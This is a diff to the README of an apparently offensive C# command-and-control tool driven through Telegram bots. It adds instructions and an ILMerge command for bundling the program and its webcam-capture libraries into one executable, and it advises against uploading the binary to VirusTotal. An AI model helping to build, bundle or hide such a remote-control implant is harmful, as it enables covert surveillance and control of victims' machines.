@@ -15,13 +15,14 @@ Team:  QQ愛&Love
 ###### Don't pass it on to Virus Total anymore. I've tried it for you.
 ![VirusTotal](https://github.com/sf197/Telegra_Csharp_C2/blob/master/images/2.png)
 
-link:https://www.virustotal.com/gui/file/9bdbb8628a19e1f036736ab74a1c19462dfd93cf901e9b0bf8e4c93ddc1914b2/detection
+link:https://www.virustotal.com/gui/file/ad1cd12bd6c8bee46ab35aa21a4fb48c2bcf9fdddbf1af82ad6f20eb75daa663/detection
 
 # All view
 
 - [Install](#Install)
 - [How to used](#how-to-used)
 - [Proxy](#Proxy)
+- [How to compile](#how-to-compile)
 
 # Install
 
@@ -106,6 +107,15 @@ proxy.ResolveHostnamesLocally = true;
 var botClient = new TelegramBotClient("YOUR_API_TOKEN", proxy);
 ```
 
-
+# How to compile
+##### How to compile all DLL files into an EXE file
+###### First,You need download ILMerge tool,this is a tool for merging all references to .NET programs.
+```cmd
+ilmerge.exe /target:exe /out:TGbot.exe ConsoleApp1.exe  AForge.Controls.dll AForge.dll AForge.Imaging.dll AForge.Math.dll AForge.Video.DirectShow.dll AForge.Video.dll Newtonsoft.Json.dll Telegram.Bot.dll /targetplatform:v4
+```
+###### /target -> library=>DLL exe=>exe
+###### /targetplatform:v4 -> Compiler platform is .net 4.0
+###### /out -> Merged output file,Parameters are followed by files that need to be merged
+Finally, generate output in the directory specified by the out parameter
 
 还在完善！还在完善！还在完善！
